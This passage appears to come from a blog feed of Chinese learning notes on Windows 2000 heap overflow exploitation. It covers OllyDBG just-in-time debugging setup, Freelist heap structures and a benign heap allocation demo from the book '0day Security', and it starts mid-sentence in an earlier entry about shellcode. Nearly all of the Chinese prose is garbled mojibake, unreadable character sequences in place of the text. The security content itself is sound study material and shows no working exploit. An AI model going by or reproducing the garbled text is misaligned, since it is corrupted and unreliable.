æ­¤æŠŠè¯¥å¼‚å¸¸äº¤ç»™è°ƒè¯•å™¨å¤„ç†äº†ï¼Œè€ŒOllyDBGè·Ÿç³»ç»Ÿå¤„ç†å¼‚å¸¸çš„æ–¹å¼ä¸åŒï¼Œå®ƒå¹¶æ²¡æœ‰è°ƒç”¨ç³»ç»Ÿçš„å¼‚å¸¸å¤„ç†å‡½æ•°ï¼Œå› æ­¤æˆ‘ä»¬çš„shellcodeæ²¡æœ‰å¾—åˆ°æ‰§è¡Œã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Learning Notes </tag>
            
            <tag> Bin </tag>
            
            <tag> Heap Overflow </tag>
            
            <tag> OllyDBG </tag>
            
            <tag> Security </tag>
            
            <tag> Windows </tag>
            
            <tag> Windows 2000 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å †æº¢å‡ºå­¦ä¹ ç¬”è®°(Win2K) (ä¸Š)</title>
      <link href="/tech/heap-overflow-learning-notes-1/"/>
      <url>/tech/heap-overflow-learning-notes-1/</url>
      
        <content type="html"><![CDATA[<ul><li>Title(EN): <em><strong>Heap Overflow Learning Notes(Win2K) #1</strong></em></li><li>Author: dog2</li></ul><hr><p>æœ€è¿‘åœ¨å•ƒã€Š0dayå®‰å…¨ï¼šè½¯ä»¶æ¼æ´åˆ†ææŠ€æœ¯ã€‹ï¼ˆç¬¬äºŒç‰ˆï¼‰ä¸€ä¹¦ï¼Œæ‰“ç®—å…¥é—¨äºŒè¿›åˆ¶æ¼æ´åˆ†æã€‚ä¹¦ä¸­ç¬¬äº”ç« â€œå †æº¢å‡ºåˆ©ç”¨â€è¾ƒå‰å‡ ç« éš¾åº¦æœ‰æ‰€å¢å¤§ï¼ŒåŸå› åœ¨äºå †ç»“æ„è¾ƒä¹‹å‰å­¦ä¹ çš„æ ˆæ›´å¤æ‚ï¼Œç¬¬äº”ç« ä¸­çš„ä¾‹å­æ¶µç›–äº†å †çš„åˆ†å¸ƒã€å †å—åˆ†é…å’Œé‡Šæ”¾ã€å †æº¢å‡ºåˆ©ç”¨ï¼Œåˆ©ç”¨å †æº¢å‡ºè¿›è¡Œæ”»å‡»çš„ä¾‹å­æ˜¯é€šè¿‡ä¿®æ”¹P.E.Bï¼ˆè¿›ç¨‹ç¯å¢ƒå—ï¼‰ä¸­æŒ‡å‘RtlEnterCriticalSection()å‡½æ•°çš„æŒ‡é’ˆï¼Œè¯¥å‡½æ•°åœ¨ç¨‹åºé€€å‡ºæ—¶è¢«è°ƒç”¨ã€‚åœ¨è°ƒè¯•å®Œæ‰€æœ‰ä¾‹å­ä»¥åï¼Œå¯¹å †çš„å†…éƒ¨ç»†èŠ‚å’Œå †æº¢å‡ºåˆ©ç”¨ç»ˆäºæœ‰äº†äº›è®¸çš„ç†è§£ã€‚</p><p>ç¬¬å…­ç« ä¸­ä¹Ÿæ¶‰åŠåˆ°å †æº¢å‡ºåˆ©ç”¨ï¼Œä¸è¿‡æ­¤å¤„æ˜¯åˆ©ç”¨Windowså¼‚å¸¸å¤„ç†æœºåˆ¶S.E.Hï¼ˆå¼‚å¸¸å¤„ç†ç»“æ„ä½“ï¼‰æ¥å®ç°æ”»å‡»çš„ï¼Œçœ‹å®Œåæ‰“ç®—è°ƒè¯•ä¸€éï¼Œå‘ç°å‡ å¤©å‰é€šè¿‡è°ƒè¯•å»ºç«‹çš„å¯¹å†…å­˜ä¸­å †åˆ†å¸ƒå’Œæ“ä½œçš„ç†è§£éƒ½å¿˜å¾—å·®ä¸å¤šäº†ï¼Œè¿™æ—¶å€™ç»ˆäºä½“ä¼šåˆ° _<strong>å­¦ä¹ è¿‡ç¨‹ä¸­æ ¹æ®è‡ªå·±çš„ä½“ä¼šåšä¸€äº›é‡è¦ç¬”è®°å¹¶ä¸”æ®æ­¤å®šæœŸå¤ä¹ çš„é‡è¦æ€§</strong>_ï¼Œå› æ­¤æœ‰äº†æœ¬ç¯‡ã€‚</p><p>å¸Œæœ›è¿™æ˜¯ä¸ªå¥½çš„å¼€å¤´ï¼Œæé†’è‡ªå·±è°¨è®°å¯¹äºå¤æ‚çš„é‡éš¾ç‚¹ï¼Œè¦ä»¥æ—¥å¿—çš„å½¢å¼å½¢æˆå­¦ä¹ ç¬”è®°ï¼Œä»¥ä¾›æ—¥åæ¸©æ•…çŸ¥æ–°ã€‚</p><p>å…³äºå †ä»¥åŠP.E.Bã€S.E.Hç­‰æœºåˆ¶çš„ä»‹ç»ï¼Œ0dayä¹¦ä¸­å·²ç»éå¸¸ç³»ç»Ÿè¯¦å°½ï¼Œæœ¬æ–‡ä¸å†èµ˜è¿°ï¼Œè¿™é‡Œä»…ç»™å‡ºæˆ‘çš„å®éªŒè°ƒè¯•è¿‡ç¨‹ï¼Œè®°å½•å…¶ä¸­è¸©çš„å‘ä»¥åŠä¸€äº›ä½“ä¼šï¼Œå› æ­¤ä»¥è¿‡ç¨‹æˆªå›¾ä¸ºä¸»ï¼Œç›¸å…³ç®€è¿°ä¸ºè¾…ã€‚ç¬¬å…­ç« ä¸­å †çš„ä¾‹å­ä½œè€…å¹¶æ²¡æœ‰ç»™å‡ºç›¸å…³ä»£ç åŠè¿‡ç¨‹ç»†èŠ‚ï¼Œè¿™é‡Œä¹Ÿä¼šé™„ä¸Šã€‚ç”±äºåˆå­¦ï¼Œæ–‡ä¸­éš¾å…å­˜åœ¨é”™è¯¯ï¼Œæ¬¢è¿æŒ‡æ­£ã€‚</p><a id="more"></a><h2 id="0x00-å‡†å¤‡å·¥ä½œ"><a href="#0x00-å‡†å¤‡å·¥ä½œ" class="headerlink" title="0x00 å‡†å¤‡å·¥ä½œ"></a>0x00 å‡†å¤‡å·¥ä½œ</h2><blockquote><p>è°ƒè¯•å †ä¸è°ƒè¯•æ ˆä¸åŒï¼Œä¸èƒ½ç›´æ¥ç”¨è°ƒè¯•å™¨OllyDBGã€WinDBGæ¥åŠ è½½ç¨‹åºï¼Œå¦åˆ™å †ç®¡ç†å‡½æ•°ä¼šæ£€æµ‹åˆ°å½“å‰è¿›ç¨‹å¤„äºè°ƒè¯•çŠ¶æ€ï¼Œè€Œä½¿ç”¨è°ƒè¯•æ€å †ç®¡ç†ç­–ç•¥ã€‚</p><p>è°ƒè¯•æ€å¯¹ç®¡ç†ç­–ç•¥å’Œå¸¸æ€å †ç®¡ç†ç­–ç•¥æœ‰å¾ˆå¤§å·®å¼‚ã€‚</p><footer><strong>ç‹æ¸…</strong><cite>ã€Š0dayå®‰å…¨ï¼šè½¯ä»¶æ¼æ´åˆ†ææŠ€æœ¯ã€‹(ç¬¬äºŒç‰ˆ) -> P153</cite></footer></blockquote><p>å› æ­¤éœ€è¦é˜²æ­¢ç¨‹åºè¿è¡Œåè¿›å…¥è°ƒè¯•æ€ï¼ŒæŒ‰ç…§ä¹¦ä¸­æ‰€è¿°ä»¥å¦‚ä¸‹æ–¹å¼è®¾ç½®ï¼š</p><ul><li>è®¾ç½®OllyDBGä¸ºé»˜è®¤è°ƒè¯•å™¨ï¼šOllyDBG -&gt; Optionsèœå• -&gt; Just-in-time debugging</li></ul><img data-src="/tech/heap-overflow-learning-notes-1/0_1.png" class="" title="å›¾0.1"><ul><li>è®¾ç½®OllyDBG ä¸æ•è·INT3ä¸­æ–­ï¼šOllyDBG -&gt; Optionsèœå• -&gt; Debugging options</li></ul><img data-src="/tech/heap-overflow-learning-notes-1/0_2.png" class="" title="å›¾0.2"><h2 id="0x01-åˆè¯†å †"><a href="#0x01-åˆè¯†å †" class="headerlink" title="0x01 åˆè¯†å †"></a>0x01 åˆè¯†å †</h2><hr><blockquote><p>åœ¨Windowsä¸­ï¼Œå ç”¨æ€çš„å †å—è¢«ä½¿ç”¨å®ƒçš„ç¨‹åºç´¢å¼•ï¼Œè€Œå †è¡¨åªç´¢å¼•æ‰€æœ‰ç©ºé—²æ€çš„å †å—ã€‚å…¶ä¸­æœ€é‡è¦çš„å †è¡¨æœ‰ä¸¤ç§ï¼šç©ºé—²åŒå‘é“¾è¡¨Freelistï¼ˆä»¥ä¸‹ç®€ç§°ç©ºè¡¨ï¼‰å’Œ å¿«é€Ÿå•å‘é“¾è¡¨Lookasideï¼ˆä»¥ä¸‹ç®€ç§°å¿«è¡¨ï¼‰ã€‚</p><p>å †çš„æ“ä½œä¸­å¯ä»¥åˆ†ä¸ºå †å—åˆ†é…ã€å †å—é‡Šæ”¾å’Œå †å—åˆå¹¶ï¼ˆCoalesceï¼‰ä¸‰ç§ã€‚å…¶ä¸­ï¼Œâ€œåˆ†é…â€å’Œâ€œé‡Šæ”¾â€æ˜¯åœ¨ç¨‹åº_ï¼ˆå³åœ¨ç”¨æˆ·ä»£ç ä¸­ï¼‰_æäº¤ç”³è¯·å’Œæ‰§è¡Œçš„ï¼Œè€Œå †å—åˆå¹¶åˆ™æ˜¯æœ‰å¯¹ç®¡ç†ç³»ç»Ÿè‡ªå·±å®Œæˆçš„ã€‚</p><footer><strong>ç‹æ¸…</strong><cite>ã€Š0dayå®‰å…¨ï¼šè½¯ä»¶æ¼æ´åˆ†ææŠ€æœ¯ã€‹(ç¬¬äºŒç‰ˆ) -> P147 & P149</cite></footer></blockquote><p>ä¸‹é¢è§‚å¯Ÿç©ºè¡¨çš„åˆ†é…ã€é‡Šæ”¾åŠåˆå¹¶ï¼Œå¿«è¡¨ä¸­æ²¡æœ‰åˆå¹¶æ“ä½œï¼Œå› æ­¤è§‚å¯Ÿå®ƒçš„åˆ†é…åŠé‡Šæ”¾ã€‚</p><h3 id="1-ç©ºé—²åŒå‘é“¾è¡¨Freelist"><a href="#1-ç©ºé—²åŒå‘é“¾è¡¨Freelist" class="headerlink" title="1. ç©ºé—²åŒå‘é“¾è¡¨Freelist"></a>1. ç©ºé—²åŒå‘é“¾è¡¨Freelist</h3><p>ç¤ºä¾‹ä»£ç å¦‚ä¸‹</p><figure class="highlight c"><figcaption><span>ã€Š0dayå®‰å…¨ï¼šè½¯ä»¶æ¼æ´åˆ†ææŠ€æœ¯ã€‹(ç¬¬äºŒç‰ˆ) -> P152 -> heap_debug.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*****************************************************************************</span></span><br><span class="line"><span class="comment">      To be the apostrophe which changed "Impossible" into "I'm possible"!</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">POC code of chapter 6.2 in book "Vulnerability Exploit and Analysis Technique"</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment">file name: heap_debug.c</span></span><br><span class="line"><span class="comment">author: failwest  </span></span><br><span class="line"><span class="comment">date: 2007.04.04</span></span><br><span class="line"><span class="comment">description: demo show of how heap works</span></span><br><span class="line"><span class="comment">Noticed:1 only run on windows 2000</span></span><br><span class="line"><span class="comment">2 complied with VC 6.0</span></span><br><span class="line"><span class="comment">3 build into release version</span></span><br><span class="line"><span class="comment">4 only used for run time debugging</span></span><br><span class="line"><span class="comment">version: 1.0</span></span><br><span class="line"><span class="comment">E-mail: failwest@gmail.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Only for educational purposes    enjoy the fun from exploiting :)</span></span><br><span class="line"><span class="comment">******************************************************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">HLOCAL h1,h2,h3,h4,h5,h6;</span><br><span class="line">HANDLE hp;</span><br><span class="line">hp = HeapCreate(<span class="number">0</span>,<span class="number">0x1000</span>,<span class="number">0x10000</span>);</span><br><span class="line">__asm <span class="keyword">int</span> <span class="number">3</span></span><br><span class="line"></span><br><span class="line">h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">3</span>);</span><br><span class="line">h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">5</span>);</span><br><span class="line">h3 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">6</span>);</span><br><span class="line">h4 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">h5 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">19</span>);</span><br><span class="line">h6 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">24</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//free block and prevent coaleses</span></span><br><span class="line">HeapFree(hp,<span class="number">0</span>,h1); <span class="comment">//free to freelist[2] </span></span><br><span class="line">HeapFree(hp,<span class="number">0</span>,h3); <span class="comment">//free to freelist[2] </span></span><br><span class="line">HeapFree(hp,<span class="number">0</span>,h5); <span class="comment">//free to freelist[4]</span></span><br><span class="line"></span><br><span class="line">HeapFree(hp,<span class="number">0</span>,h4); <span class="comment">//coalese h3,h4,h5,link the large block to freelist[8]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘ç¯å¢ƒå¦‚ä¸‹ï¼š</p><ul><li>æ“ä½œç³»ç»Ÿï¼šè¿è¡ŒäºVmwareè™šæ‹Ÿæœºï¼Œç‰ˆæœ¬Win 2K SP4 5.00.2195 EN</li><li>ç¼–è¯‘å™¨ï¼šVisual C++ 6.0</li><li>ç¼–è¯‘é€‰é¡¹ï¼šé»˜è®¤é€‰é¡¹</li><li>buildç‰ˆæœ¬ï¼šreleaseç‰ˆ</li></ul><p>è¿è¡Œç¨‹åºï¼Œç”±äºINT3ä¸­æ–­äº§ç”Ÿå¼‚å¸¸ï¼Œå¦‚ä¸‹å›¾ï¼š</p><img data-src="/tech/heap-overflow-learning-notes-1/1_1_1.png" class="" title="å›¾1.1.1"><p>é€‰æ‹©Cancelä»¥åŠ è½½é»˜è®¤è°ƒè¯•å™¨OllyDBGã€‚</p><h4 id="1-å¯»æ‰¾ä»£ç HeapCreate-æ‰€åˆ›å»ºçš„å †"><a href="#1-å¯»æ‰¾ä»£ç HeapCreate-æ‰€åˆ›å»ºçš„å †" class="headerlink" title="(1) å¯»æ‰¾ä»£ç HeapCreate()æ‰€åˆ›å»ºçš„å †"></a>(1) å¯»æ‰¾ä»£ç HeapCreate()æ‰€åˆ›å»ºçš„å †</h4><p>è¿›å…¥OllyDBGåï¼Œå•å‡»ä¸‹å›¾ä¸­çš„MæŒ‰é’®ï¼Œä»¥æŸ¥çœ‹ç¨‹åºå½“å‰çš„å†…å­˜æ˜ å°„çŠ¶æ€ï¼š</p><img data-src="/tech/heap-overflow-learning-notes-1/1_1_2.png" class="" title="å›¾1.1.2"><p>ä¸ä¸Šå›¾å¯¹åº”çš„0dayä¹¦ä¸­å›¾5.2.5æŒ‡å‡ºäº†å†…å­˜æ˜ å°„Memory Mapä¸­è¿›ç¨‹å †ã€mallocä½¿ç”¨å †ã€å®éªŒä¸­HeapCreate()åˆ›å»ºçš„å †çš„èµ·å§‹åœ°å€ï¼Œä½œè€…æ²¡æœ‰è¯´æ˜å2ä¸ªæ˜¯å¦‚ä½•åˆ¤æ–­çš„ï¼Œæˆ‘çš„ç†è§£å¦‚ä¸‹ï¼š</p><ul><li>mallocä½¿ç”¨å †ï¼šè¿™é‡Œæˆ‘è¿˜æ— æ³•åˆ¤æ–­ï¼Œå› ä¸ºä¸Šå›¾çš„å†…å­˜æ˜ å°„æƒ…å†µè·Ÿä¹¦ä¸­çš„å›¾æœ‰è¾ƒå¤§ä¸åŒã€‚</li><li>å®éªŒä¸­HeapCreate()åˆ›å»ºçš„å †ï¼šå¯ç”¨æ ¹æ®å¤§å°ä¸º0x1000ä»¥åŠTypeä¸ºPrivæ¥ç­›é€‰ï¼Œ0x0012D000è™½ç„¶ä¹Ÿæ»¡è¶³ï¼Œä½†æ˜¯åœ°å€å¾ˆå°ï¼Œåœ¨çº¿ç¨‹åŠè¿›ç¨‹å †é™„è¿‘ï¼Œåº”è¯¥ä¸æ˜¯ç”¨æˆ·æ‰€åˆ›å»ºçš„å †ã€‚å› æ­¤å¯ç”¨ç­›é€‰å‡º0x00360000ä¸ºç¨‹åºä»£ç åˆ›å»ºçš„å †ã€‚</li></ul><p>ä¸Šé¢è®¨è®ºçš„æ˜¯åªæ ¹æ®è§‚å¯ŸMemory mapæ¥è¯†åˆ«å„ç§ç±»å‹çš„å †ï¼Œå…¶å®æœ¬ä¾‹ä¸­è¦åˆ¤æ–­HeapCreate()åˆ›å»ºçš„å †å¯ç›´æ¥æ ¹æ®å½“å‰æ±‡ç¼–ä»£ç è¿è¡Œåˆ°INT3æ—¶EAXçš„å€¼æ¥åˆ¤æ–­ï¼Œå³ä¸º0x00360000ï¼Œå› ä¸ºåœ¨INT3ä»£ç ä¹‹å‰åˆšåˆšè°ƒç”¨äº†HeapCreate()å‡½æ•°ï¼Œå¹¶ä¸”è¿”å›äº†åˆ›å»ºçš„å †çš„å…¶å®åœ°å€ï¼Œè¯¥å€¼æ­£å­˜å‚¨åœ¨EAXä¸­ï¼Œå¦‚ä¸‹å›¾ï¼š</p><img data-src="/tech/heap-overflow-learning-notes-1/1_1_3.png" class="" title="å›¾1.1.3"><h4 id="2-è§‚å¯Ÿå †è¡¨ä¿¡æ¯"><a href="#2-è§‚å¯Ÿå †è¡¨ä¿¡æ¯" class="headerlink" title="(2) è§‚å¯Ÿå †è¡¨ä¿¡æ¯"></a>(2) è§‚å¯Ÿå †è¡¨ä¿¡æ¯</h4><blockquote><p>ç©ºé—²å †å—çš„å—é¦–ä¸­åŒ…å«ä¸€å¯¹é‡è¦æŒ‡é’ˆï¼Œè¿™å¯¹æŒ‡é’ˆç”¨äºå°†ç©ºé—²å †å—ç»„ç»‡æˆåŒå‘é“¾è¡¨ã€‚æŒ‰ç…§å †å—çš„å¤§å°ä¸åŒï¼Œç©ºè¡¨æ€»å…±è¢«åˆ†ä¸º128æ¡ã€‚</p><p>å †åŒºä¸€å¼€å§‹çš„å †è¡¨åŒºä¸­æœ‰ä¸€ä¸ª128é¡¹çš„æŒ‡é’ˆæ•°ç»„ï¼Œè¢«ç§°åšç©ºè¡¨ç´¢å¼•ï¼ˆFreelist arrayï¼‰ã€‚è¯¥æ•°ç»„çš„æ¯ä¸€é¡¹åŒ…æ‹¬ä¸¤ä¸ªæŒ‡é’ˆï¼Œç”¨äºæ ‡è¯†ä¸€ä¸ªç©ºè¡¨ã€‚</p><footer><strong>ç‹æ¸…</strong><cite>ã€Š0dayå®‰å…¨ï¼šè½¯ä»¶æ¼æ´åˆ†ææŠ€æœ¯ã€‹(ç¬¬äºŒç‰ˆ) -> P147</cite></footer></blockquote><p>åœ¨å†…å­˜æŸ¥çœ‹çª—å£ä¸­ï¼ŒCtrl+Gæ¥åˆ°åœ°å€0x00360000å¤„ï¼Œè§‚å¯Ÿå†…å­˜ï¼Œå¦‚ä¸‹å›¾ï¼š</p><img data-src="/tech/heap-overflow-learning-notes-1/1_1_4.png" class="" title="å›¾1.1.4"><p>æŒ‰ç…§ä¹¦ä¸­ä»‹ç»ï¼Œä»0x00360000å¼€å§‹ï¼Œå †è¡¨ä¸­åŒ…å«çš„ä¿¡æ¯ä¾æ¬¡ä¸º</p><ul><li>æ®µè¡¨ç´¢å¼• Segment List</li><li>è™šè¡¨ç´¢å¼• Virtual Allocation list</li><li>ç©ºè¡¨ä½¿ç”¨æ ‡è¯† freelist usage bitmap</li><li>ç©ºè¡¨ç´¢å¼•åŒº</li></ul><p>è¿™é‡Œåªå…³å¿ƒä»åç§»0x178å¤„(è·ç¦»å †èµ·å§‹åœ°å€0x00360000çš„åç§»ï¼Œåæ–‡çœç•¥)å¼€å§‹çš„ç©ºè¡¨ç´¢å¼•åŒºï¼Œè¿™ä¸ªåŒºåŸŸå­˜æ”¾ç€Freelistæ•°ç»„Freelist[0]~Freelist[127]ï¼Œæ¯ä¸ªæ•°ç»„å…ƒç´ å¤§å°ä¸º8Byteï¼ŒåŒ…å«2ä¸ª4ByteæŒ‡é’ˆï¼Œå‰å‘æŒ‡é’ˆflinkï¼ˆæŒ‡å‘æ‰€åœ¨é“¾è¡¨ä¸­ä¸‹ä¸€ä¸ªå †å—ï¼‰å’Œåå‘æŒ‡é’ˆblinkï¼ˆæŒ‡å‘æ‰€åœ¨é“¾è¡¨ä¸­å‰ä¸€ä¸ªå †å—ï¼‰ã€‚</p><p>å‚è€ƒä¹¦ä¸­å›¾5.1.2ï¼Œç©ºè¡¨ç´¢å¼•æ˜¯ç”¨æ¥ç´¢å¼•ä¸åŒå¤§å°çš„å †å—æ•°æ®é“¾çš„ã€‚å †å—ç”¨æ¥å­˜å‚¨æ•°æ®ï¼Œå…¶æœ€å°å•ä½ä¸º8 Byteï¼Œç©ºé—²å †å—æŒ‰ç…§å…¶å¤§å°è¢«åŒºåˆ†å¼€æ¥ï¼Œç›¸åŒå¤§å°çš„ç©ºé—²å †å—è¢«ä¸²æ¥èµ·æ¥ï¼Œå½¢æˆä¸€ä¸ªåŒ…å«è‹¥å¹²ä¸ªåŒæ ·å¤§å°çš„å †å—å †å—é“¾ã€‚å¦‚Freelist[1]æŒ‡å‘çš„æ˜¯ä¸€æ¡ç”±è‹¥å¹²ä¸ªå¤§å°éƒ½ä¸º 1 x 8 Byteçš„å †å—ä¸²æ¥èµ·æ¥çš„å †å—æ•°æ®é“¾ï¼Œä¾æ­¤ç±»æ¨ï¼ŒFreelist[127]æŒ‡å‘çš„æ˜¯ä¸€æ¡ç”±è‹¥å¹²ä¸ªå¤§å°éƒ½ä¸º 127 x 8 Byteçš„å †å—ä¸²æ¥èµ·æ¥çš„å †å—æ•°æ®é“¾ï¼Œå…¶ä¸­å‰å‘æŒ‡é’ˆflinkæŒ‡å‘çš„æ˜¯å †å—æ•°æ®é“¾ä¸­çš„ç¬¬ä¸€ä¸ªå †å—ï¼Œåå‘æŒ‡é’ˆblinkæŒ‡å‘çš„æ˜¯æœ€åä¸€ä¸ªå †å—ã€‚Freelist[0]è¾ƒä¸ºç‰¹æ®Šï¼Œå®ƒé“¾å…¥æ‰€æœ‰ å¤§äºç­‰äº1024 Byteä¸”å°äº512 KBçš„å †å—ï¼Œè¿™äº›å †å—æŒ‰ç…§å„è‡ªçš„å¤§å°åœ¨Freelist[0]ä¸­å‡åºä¸²æ¥ã€‚</p><img data-src="/tech/heap-overflow-learning-notes-1/0day_5_1_2.png" class="" title="ã€Š0dayå®‰å…¨ï¼šè½¯ä»¶æ¼æ´åˆ†ææŠ€æœ¯ã€‹(ç¬¬äºŒç‰ˆ) -&gt; P148 -&gt; å›¾5.1.2"><p>å€¼å¾—ä¸€æçš„æ˜¯ï¼Œå‚è€ƒä¹¦ä¸­å›¾5.2.8å’Œ5.2.9ï¼Œæ¯ä¸ªå®Œæ•´çš„å †å—çš„å‰8 Byteæ˜¯å—é¦–ï¼Œå­˜å‚¨ç€è¯¥å—å¤§å°ã€çŠ¶æ€ç­‰ç›¸å…³ä¿¡æ¯ã€‚</p><img data-src="/tech/heap-overflow-learning-notes-1/0day_5_2_8.png" class="" title="ã€Š0dayå®‰å…¨ï¼šè½¯ä»¶æ¼æ´åˆ†ææŠ€æœ¯ã€‹(ç¬¬äºŒç‰ˆ) -&gt; P156 -&gt; å›¾5.2.8"><img data-src="/tech/heap-overflow-learning-notes-1/0day_5_2_9.png" class="" title="ã€Š0dayå®‰å…¨ï¼šè½¯ä»¶æ¼æ´åˆ†ææŠ€æœ¯ã€‹(ç¬¬äºŒç‰ˆ) -&gt; P157 -&gt; å›¾5.2.9"><p>å—é¦–ä¹‹åæ•°æ®çš„ä½œç”¨æ ¹æ®è¯¥å †å—æ˜¯å¦ç©ºé—²æœ‰æ‰€ä¸åŒï¼š</p><ul><li>ç©ºé—²æ€å †å—ä¸­ï¼Œç´§æ¥ç€å—é¦–çš„8 ByteåŒ…å«è¯¥ç©ºé—²å—çš„å‰å‘æŒ‡é’ˆå’Œåå‘æŒ‡é’ˆï¼Œä½™ä¸‹çš„å­—èŠ‚å°±æ˜¯å®é™…æ•°æ®äº†ã€‚</li><li>å ç”¨æ€å †å—ä¸­ï¼Œå—é¦–ä¹‹åä¾¿æ˜¯å®é™…æ•°æ®çš„æ•°æ®ã€‚</li></ul><p>å› æ­¤ï¼Œ1ä¸ªåŒ…å«8 Byteæ•°æ®çš„å †å—ï¼Œåœ¨å†…å­˜ä¸­å ç”¨çš„å®é™…ç©ºé—´ä¸º16 Byteã€‚å½“è¯¥å †å—ä¸ºç©ºé—²æ€æ—¶ï¼Œ8-15 Byteä¸ºå‰å‘æŒ‡é’ˆå’Œåå‘æŒ‡é’ˆï¼›å½“è¯¥å †å—ä¸ºå ç”¨æ€æ—¶ï¼Œå8 Byteä¸ºå®é™…æ•°æ®ã€‚</p><p>æˆ‘ä»¬å‘ç°å›¾1.1.4ä¸­çš„ç©ºè¡¨ç´¢å¼•åŒºä¸­é™¤äº†Freelist[0]ä¸­çš„2ä¸ªæŒ‡é’ˆéƒ½æŒ‡å‘0x688ï¼Œä¹‹åæ¯ä¸ªå…ƒç´ ä¸­çš„å‰å‘æŒ‡é’ˆå’Œåå‘æŒ‡é’ˆéƒ½æŒ‡å‘è¯¥å…ƒç´ çš„èµ·å§‹åœ°å€ï¼Œè¿™æ˜¯å› ä¸ºåˆå§‹çŠ¶æ€ä¸‹çš„å †æ˜¯æ²¡æœ‰çš„å›ºå®šå¤§å°çš„ç©ºé—²å—çš„ï¼Œé™¤äº†ä¸€ä¸ªéå¸¸å¤§ã€è¿ç»­çš„åˆå§‹ç©ºé—²å—ï¼Œå³å°¾å—ï¼Œå®ƒæ­£æ˜¯Freelist[0]çš„2ä¸ªæŒ‡é’ˆæ‰€æŒ‡çš„å †å—ã€‚</p><p>æˆ‘ä»¬æ¥åˆ°0x680è§‚å¯Ÿå°¾å—ï¼Œå¦‚ä¸‹å›¾</p><img data-src="/tech/heap-overflow-learning-notes-1/1_1_5.png" class="" title="å›¾1.1.5"><p>ä»ä¸Šå›¾å¯ä»¥çœ‹å‡ºï¼Œå°¾å—çš„å¤§å°ä¸º0x130 x 8 Byteï¼Œå‰åå‘æŒ‡é’ˆéƒ½æŒ‡å‘freelist[0]ã€‚</p><p>è¿™é‡Œå€¼å¾—ä¸€æçš„æ˜¯å—é¦–ä¿¡æ¯ä¸­çš„Self Sizeçš„å•ä½æ˜¯8 Byteï¼Œä¹Ÿå°±æ˜¯è¯´è¯¥Self Sizeå€¼ä¸º1çš„æœ€å°å †æ•°æ®å—å ç”¨çš„å†…å­˜ä¸º 1 x 8 Byteï¼Œè¿™æ˜¯å †å—æ•°æ®çš„æœ€å°å ç”¨å†…å­˜ã€‚</p><p>æ³¨æ„ï¼Œå°¾å—å—é¦–ä½äº0x680ï¼Œè€ŒéFreelist[0]ä¸­æŒ‡é’ˆæŒ‡å‘çš„0x688ï¼Œå› ä¸º<strong>ç©ºè¡¨ä¸­çš„å‰å‘æŒ‡é’ˆå’Œåå‘æŒ‡é’ˆæŒ‡å‘çš„éƒ½æ˜¯å †å—ä¸­å®é™…æ•°æ®çš„å†…å­˜åœ°å€ï¼Œè€Œéå—é¦–çš„åœ°å€ã€‚</strong></p><h4 id="3-è§‚å¯Ÿå †å—çš„åˆ†é…"><a href="#3-è§‚å¯Ÿå †å—çš„åˆ†é…" class="headerlink" title="(3) è§‚å¯Ÿå †å—çš„åˆ†é…"></a>(3) è§‚å¯Ÿå †å—çš„åˆ†é…</h4><p>ç»§ç»­è·Ÿè¿›ä»£ç ï¼Œæ¥è§‚å¯Ÿå †å—çš„åˆ†é…ä¸é‡Šæ”¾ï¼Œä½†éšå³é‡åˆ°ä¸€ä¸ªå‘ï¼šä¸ç®¡ Debugging optionsä¸­æ€ä¹ˆè®¾ç½®ï¼Œä»£ç æ‰§è¡Œåˆ°0x0040101Då¤„çš„INT3ä¹‹å‰ï¼Œç»§ç»­F8æ‰§è¡ŒINT3ï¼Œä¼šè¿›å…¥å†…æ ¸ä»£ç ç›´åˆ°ç»ˆæ­¢ï¼Œä¸ä¼šç»§ç»­æ‰§è¡ŒINT3ä¹‹åçš„ä»£ç ã€‚åœ¨çœ‹é›ªè®ºå›é‡Œçœ‹åˆ°å¤§å®¶ä¹Ÿé‡åˆ°äº†è¿™ç§æƒ…å†µï¼Œä¹Ÿæ²¡æœ‰å¤ªå¥½çš„è§£å†³åŠæ³•ã€‚é—®é¢˜è‚¯å®šå‡ºåœ¨æ±‡ç¼–ä»£ç int3ï¼Œå› 